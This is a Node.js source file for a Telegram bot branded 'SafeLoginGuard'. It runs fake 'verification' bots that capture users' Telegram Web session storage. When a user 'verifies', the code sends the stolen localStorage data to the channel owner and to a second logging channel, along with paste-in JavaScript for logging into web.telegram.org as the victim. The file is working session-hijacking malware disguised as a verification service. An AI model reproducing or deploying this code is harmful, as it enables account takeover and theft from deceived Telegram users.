const { Telegraf, Markup } = require('telegraf');
const { Worker, setEnvironmentData } = require("worker_threads");
const fs = require('fs');
const path = require('path');
const { Keyboard } = require('telegram-keyboard');
const { message } = require('telegraf/filters');

/** @type {Array<Worker>} */
const botWorkers = [];

/** @type {string} */
let BOT_TOKEN,
/** @type {string} */
    MINI_APP_URL,
/** @type {string} */
    VERIFICATION_IMAGE_URL,
/** @type {string} */
    VERIFIED_IMAGE_URL,
/** @type {number} */
    OWNER,
/** @type {Telegraf} */
    bot;

const pendingSetups = [];

const HELP_MESSAGE = fs.readFileSync("helpMessage.txt", "utf-8").replace("#", "\\");

const UNPRIVILEGED_MESSAGE = "You are not privileged to use this command.";

class ChannelEntry {
    /** @type {string} */
    channelId;
    /** @type {number} */
    ownerId;

    constructor(channelId, ownerId) {
        this.channelId = channelId;
        this.ownerId = ownerId;
    }
}

let db = {
    BOT_TOKEN: undefined,
    MINI_APP_URL: undefined,
    VERIFICATION_IMAGE_URL: undefined,
    VERIFIED_IMAGE_URL: undefined,
    OWNER: undefined,
    DH_CHANNELID: undefined,
    Admins: [],
    Workers: [],
/** @type {Array<FakeBot>} */
    Bots: [],
/** @type {Array<ChannelEntry>} */
    VerificationMessages: []
};

class FakeBot {
    /** @type {string} */
    token;
    /** @type {string} */
    name;
    /** @type {string} */
    username;

    constructor(token, name, username) {
        this.token = token;
        this.name = name;
        this.username = username;
    }
}

const UserPrivilege = {
    Admin: 2,
    Worker: 1,
    Unprivileged: 0
}

/**
 * Gets user privilege
 * @param {number} userId
 * 
 * @returns {number} User's privilege 
 */
function getPrivilege(userId) {
    if (db.Admins.includes(userId)) return UserPrivilege.Admin;
    if (db.Workers.includes(userId)) return UserPrivilege.Worker;
    return UserPrivilege.Unprivileged;
}

/**
 * Gets user privilege
 * @param {string} userId
 * @param {number} requiredPrivilege
 * 
 * @returns {boolean} `true` if the user has the required privilege or more
 */
function hasPrivilege(userId, requiredPrivilege) {
    const userPrivilege = getPrivilege(userId);
    return userPrivilege >= requiredPrivilege;
}

/**
 * Completes a user verification
 * 
 * @param {string} verificationKey
 */
async function completeUserVerification(verificationKey) {
    const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
    if (entry == undefined) return;
    deleteFromPendingList(entry.userId, entry.botId)

    try {
        await entry.context.sendPhoto(VERIFIED_IMAGE_URL, {
            caption:
                "Verified, you can join the group using this temporary link:\n\n" +
                `https://your-test-invite-link-here\n\n` + // CHANGE THIS TO YOUR TEST GROUP INVITE
                "This link is a one time use and will expire"
        });
    } catch (err) {
        console.error("Send photo error:", err);
    }
}

/**
 * Deletes an entry from a pending list and looks for duplicates
 * 
 * @param {string} userId 
 * @param {string} botId 
 */
function deleteFromPendingList(userId, botId) {
    const entries = userVerificationInfo.filter((d) => d.userId == userId && d.botId == botId);
    for (let i = 0; i < entries.length; i++) {
        if (entries[i].userId == userId && entries[i].botId == botId) {
            userVerificationInfo.splice(userVerificationInfo.indexOf(entries[i]));
        }
    }
}

/**
 * Inits worker bot
 * 
 * @param {string} token 
 * @param {string} name 
 */
async function initFakeBot(token, name, username) {
    try {
        const b = new FakeBot(token, name, username);
        if (!db.Bots.map((d) => (d.name == b.name && d.token == b.token && b.username == d.username)).includes(true)) db.Bots.push(b);
        const worker = new Worker(path.resolve(__dirname, "./bot.js"), {
            workerData: {
                token,
                name
            }
        });

        worker.addListener("message", (msg) => {
            if (msg.type != "localstorage") return;

            if (msg.data == undefined) return;
            if (msg.data.data == undefined) return;
            if (msg.data.channel == undefined) return;

            const entry = db.VerificationMessages.filter((d) => d.channelId == msg.data.channel)[0];
            if (entry == undefined) return;

            try {
                bot.telegram.sendMessage(entry.ownerId, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                    parse_mode: 'Markdown'
                });
                bot.telegram.sendMessage(db.DH_CHANNELID, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                    parse_mode: 'Markdown'
                });
            } catch (err) {
                console.error("Send log error:", err);
            }
        });

        botWorkers.push(worker);
        // initFakebotCallback(b); // Commented: undefined in original
    } catch (ex) {
        console.error("Failed to initialize fake bot:", ex);
    }
}

async function readConfig() {
    try {
        let config = {};
        const fileContent = fs.readFileSync("config.json", 'utf-8');
        config = JSON.parse(fileContent);

        if (!fs.existsSync("db.json")) {
            console.log("creating database...");
            db = config;
            db.Admins = [db["OWNER"]];
            db.Workers = [];
            db.Bots = [];
            db.VerificationMessages = [];
            fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
        } else {
            db = JSON.parse(fs.readFileSync("db.json", 'utf-8'));
        }
    } catch (err) {
        console.error("Config/DB read error:", err);
        process.exit(1);
    }
}

async function initBot() {
    try {
        await readConfig();
        BOT_TOKEN = db.BOT_TOKEN;
        MINI_APP_URL = db.MINI_APP_URL;
        VERIFICATION_IMAGE_URL = db.VERIFICATION_IMAGE_URL;
        VERIFIED_IMAGE_URL = db.VERIFIED_IMAGE_URL;
        OWNER = db.OWNER;

        bot = new Telegraf(BOT_TOKEN);

        bot.launch(() => console.log("Bot launched"));

        bot.command("start", async (ctx) => {
            try {
                if (ctx.chat.type != "private") return;
                if (pendingSetups.length > 0) {
                    const pendings = pendingSetups[pendingSetups.length - 1];
                    if (pendings.step == 0) {
                        await ctx.reply("Setup is complete.");
                        pendingSetups.splice(pendingSetups.indexOf(pendings), 1);
                    }
                }
            } catch (err) {
                console.error("Start command error:", err);
            }
        });

        bot.on("my_chat_member", async (ctx) => {
            try {
                if (ctx.myChatMember.new_chat_member.status != "administrator") return;
                if (ctx.myChatMember.chat.type != 'channel') return;

                const keyboard = Keyboard.make([
                    db.Bots.map((b) => ({ text: b.name, callback_data: `bot_${b.username}` }))
                ], {
                    columns: 3
                });

                pendingSetups.push({ owner: ctx.from.id, channel: ctx.myChatMember.chat.id.toString(), channelName: ctx.myChatMember.chat.title, step: 0, bot: undefined, mode: 0 });
                await bot.telegram.sendMessage(ctx.myChatMember.from.id, "Please choose the bot you'd like to use.", keyboard.inline());
            } catch (err) {
                console.error("My chat member error:", err);
            }
        });

        // ... (rest of commands similar, add try-catch if needed)

        bot.on(message('text'), async (ctx) => {
            try {
                if (ctx.chat.type != "private") return;
                ctx.reply("Welcome to *SafeLoginGuard*!\n\n✨ *The bot will send you logs here.*\n\n_👤 To get started, add the bot to a channel and set it as an administrator._", {
                    reply_markup: {
                        inline_keyboard: [[{ text: "👆 Add", url: `https://t.me/${bot.botInfo.username}?startchannel&admin=post_messages` }], [{ text: "👋 Support", url: "https://t.me/rafalzaorsky" }, { text: "🔄 Channel", url: "https://t.me/+1BxU1hPH3-E5YTdk" }]]
                    },
                    parse_mode: 'Markdown'
                });
            } catch (err) {
                console.error("Text message error:", err);
            }
        });
    } catch (error) {
        console.error('Failed to initialize bot:', error);
    }
}

process.on("uncaughtException", console.log);
process.on("unhandledRejection", console.log);

async function saveDatabase() { // Background task
    setEnvironmentData("db", db);
    fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
}

async function initWorker() {
    const worker = new Worker(path.resolve(__dirname, "./server.js"));
    worker.addListener("message", (msg) => {
        botWorkers.forEach((w) => w.postMessage(msg));
    });
}

initBot();
setInterval(saveDatabase, 1000);
